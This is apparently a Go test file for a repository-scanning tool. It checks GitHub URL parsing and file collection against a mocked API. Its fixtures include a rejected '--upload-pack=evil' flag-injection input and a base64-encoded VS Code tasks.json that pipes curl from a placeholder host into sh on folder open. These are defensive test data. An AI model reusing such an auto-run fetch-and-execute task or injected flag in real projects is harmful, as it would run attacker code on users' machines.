package source

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync/atomic"
	"testing"
)

func TestParseGitHubTarget(t *testing.T) {
	tests := []struct {
		name      string
		raw       string
		wantOwner string
		wantRepo  string
		wantRef   string
		wantErr   bool
	}{
		{
			name:      "https root",
			raw:       "https://github.com/Jehudavd/gitwasp",
			wantOwner: "Jehudavd",
			wantRepo:  "gitwasp",
		},
		{
			name:      "https with .git and trailing slash",
			raw:       "https://github.com/Jehudavd/gitwasp.git/",
			wantOwner: "Jehudavd",
			wantRepo:  "gitwasp",
		},
		{
			name:      "https tree branch with slash",
			raw:       "https://github.com/Jehudavd/gitwasp/tree/feat/stage-2",
			wantOwner: "Jehudavd",
			wantRepo:  "gitwasp",
			wantRef:   "feat/stage-2",
		},
		{
			name:      "git ssh",
			raw:       "git@github.com:Jehudavd/gitwasp.git",
			wantOwner: "Jehudavd",
			wantRepo:  "gitwasp",
		},
		{
			name:      "ssh scheme",
			raw:       "ssh://git@github.com/Jehudavd/gitwasp.git",
			wantOwner: "Jehudavd",
			wantRepo:  "gitwasp",
		},
		{
			name:      "owner/repo shorthand",
			raw:       "Jehudavd/gitwasp",
			wantOwner: "Jehudavd",
			wantRepo:  "gitwasp",
		},
		{
			name:    "non-github host rejected",
			raw:     "https://gitlab.com/example/repo",
			wantErr: true,
		},
		{
			name:    "flag injection rejected",
			raw:     "--upload-pack=evil",
			wantErr: true,
		},
		{
			name:    "path traversal rejected",
			raw:     "https://github.com/../secret",
			wantErr: true,
		},
		{
			name:    "empty rejected",
			raw:     "   ",
			wantErr: true,
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			got, err := ParseGitHubTarget(tc.raw)
			if tc.wantErr {
				if err == nil {
					t.Fatalf("expected error for %q, got %+v", tc.raw, got)
				}
				return
			}
			if err != nil {
				t.Fatalf("unexpected error for %q: %v", tc.raw, err)
			}
			if got.Owner != tc.wantOwner || got.Repo != tc.wantRepo || got.Ref != tc.wantRef {
				t.Fatalf("got %+v, want owner=%s repo=%s ref=%s", got, tc.wantOwner, tc.wantRepo, tc.wantRef)
			}
			wantClone := "https://github.com/" + tc.wantOwner + "/" + tc.wantRepo + ".git"
			if got.CloneURL != wantClone {
				t.Fatalf("CloneURL = %q, want %q", got.CloneURL, wantClone)
			}
		})
	}
}

func TestCollectGitHubSuccessAndFiltering(t *testing.T) {
	var authHeader atomic.Value
	multilineTasks := base64.StdEncoding.EncodeToString([]byte(`{"tasks":[{"label":"x","command":"curl https://payload.example.invalid/x | sh","runOptions":{"runOn":"folderOpen"}}]}`))
	if len(multilineTasks) > 20 {
		multilineTasks = multilineTasks[:20] + "\n" + multilineTasks[20:]
	}

	blobs := map[string]string{
		"sha-tasks":   multilineTasks,
		"sha-script":  base64.StdEncoding.EncodeToString([]byte("#!/bin/sh\necho hi\n")),
		"sha-bin":     base64.StdEncoding.EncodeToString([]byte{0x00, 0x01, 0x02}),
		"sha-ignored": base64.StdEncoding.EncodeToString([]byte("console.log('src')")),
	}

	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if auth := r.Header.Get("Authorization"); auth != "" {
			authHeader.Store(auth)
		}
		w.Header().Set("Content-Type", "application/json")
		switch r.URL.Path {
		case "/repos/acme/demo":
			_ = json.NewEncoder(w).Encode(map[string]any{"default_branch": "main"})
		case "/repos/acme/demo/git/trees/main":
			_ = json.NewEncoder(w).Encode(map[string]any{
				"tree": []map[string]any{
					{"path": "README.md", "type": "blob", "sha": "sha-readme", "size": 100},
					{"path": "src/app.js", "type": "blob", "sha": "sha-ignored", "size": 50},
					{"path": "node_modules/pkg/postinstall.js", "type": "blob", "sha": "sha-ignored", "size": 50},
					{"path": ".vscode/tasks.json", "type": "blob", "sha": "sha-tasks", "size": 120},
					{"path": "scripts/setup.sh", "type": "blob", "sha": "sha-script", "size": 20},
					{"path": "scripts/bin.js", "type": "blob", "sha": "sha-bin", "size": 3},
					{"path": "scripts/huge.sh", "type": "blob", "sha": "sha-huge", "size": MaxFileSize + 100},
				},
			})
		case "/repos/acme/demo/git/blobs/sha-tasks":
			_ = json.NewEncoder(w).Encode(map[string]any{"encoding": "base64", "content": blobs["sha-tasks"]})
		case "/repos/acme/demo/git/blobs/sha-script":
			_ = json.NewEncoder(w).Encode(map[string]any{"encoding": "base64", "content": blobs["sha-script"]})
		case "/repos/acme/demo/git/blobs/sha-bin":
			_ = json.NewEncoder(w).Encode(map[string]any{"encoding": "base64", "content": blobs["sha-bin"]})
		default:
			t.Errorf("unexpected API call: %s", r.URL.Path)
			http.NotFound(w, r)
		}
	}))
	defer srv.Close()

	repo := GitHubRepo{Owner: "acme", Repo: "demo", CloneURL: "https://github.com/acme/demo.git"}
	files, skipped, ref, err := CollectGitHub(context.Background(), repo, GitHubOptions{
		APIBaseURL: srv.URL,
		Token:      "test-secret-token",
		HTTPClient: srv.Client(),
	})
	if err != nil {
		t.Fatalf("CollectGitHub failed: %v", err)
	}
	if ref != "main" {
		t.Fatalf("resolved ref = %q, want main", ref)
	}
	if auth, _ := authHeader.Load().(string); auth != "Bearer test-secret-token" {
		t.Fatalf("Authorization header = %q, want Bearer test-secret-token", auth)
	}
	if len(files) != 2 {
		t.Fatalf("expected 2 text target files (.vscode/tasks.json, scripts/setup.sh), got %d: %+v", len(files), files)
	}
	if files[0].Path != ".vscode/tasks.json" || files[1].Path != "scripts/setup.sh" {
		t.Fatalf("unexpected collected paths: %+v", files)
	}
	// Skipped should include huge.sh (oversized) + bin.js (binary NUL byte) = 2
	if skipped != 2 {
		t.Fatalf("expected skipped=2, got %d", skipped)
	}
}

func TestCollectGitHubPriorityCapAndErrorHandling(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch r.URL.Path {
		case "/repos/acme/rate":
			w.Header().Set("X-RateLimit-Remaining", "0")
			w.WriteHeader(http.StatusForbidden)
			_, _ = w.Write([]byte(`{"message":"API rate limit exceeded"}`))
		case "/repos/acme/priv":
			w.WriteHeader(http.StatusNotFound)
			_, _ = w.Write([]byte(`{"message":"Not Found"}`))
		case "/repos/acme/cap/git/trees/v1":
			_ = json.NewEncoder(w).Encode(map[string]any{
				"tree": []map[string]any{
					{"path": "scripts/z.sh", "type": "blob", "sha": "sha-z", "size": 10},
					{"path": ".vscode/tasks.json", "type": "blob", "sha": "sha-t", "size": 10},
				},
			})
		case "/repos/acme/cap/git/blobs/sha-t":
			_ = json.NewEncoder(w).Encode(map[string]any{"encoding": "base64", "content": base64.StdEncoding.EncodeToString([]byte(`{}`))})
		default:
			t.Errorf("unexpected fetch: %s", r.URL.Path)
			http.NotFound(w, r)
		}
	}))
	defer srv.Close()

	_, _, _, err := CollectGitHub(context.Background(), GitHubRepo{Owner: "acme", Repo: "rate"}, GitHubOptions{
		APIBaseURL: srv.URL,
		HTTPClient: srv.Client(),
	})
	if err == nil || !strings.Contains(err.Error(), "rate limit") {
		t.Fatalf("expected rate limit error, got %v", err)
	}

	_, _, _, err = CollectGitHub(context.Background(), GitHubRepo{Owner: "acme", Repo: "priv"}, GitHubOptions{
		APIBaseURL: srv.URL,
		HTTPClient: srv.Client(),
	})
	if err == nil || !strings.Contains(err.Error(), "GITHUB_TOKEN") {
		t.Fatalf("expected GITHUB_TOKEN hint for 404, got %v", err)
	}

	files, skipped, _, err := CollectGitHub(context.Background(), GitHubRepo{Owner: "acme", Repo: "cap", Ref: "v1"}, GitHubOptions{
		APIBaseURL:     srv.URL,
		HTTPClient:     srv.Client(),
		MaxRemoteFiles: 1,
	})
	if err != nil {
		t.Fatalf("unexpected cap test error: %v", err)
	}
	if len(files) != 1 || files[0].Path != ".vscode/tasks.json" || skipped != 1 {
		t.Fatalf("expected priority 1 .vscode/tasks.json with skipped=1, got files=%+v skipped=%d", files, skipped)
	}
}
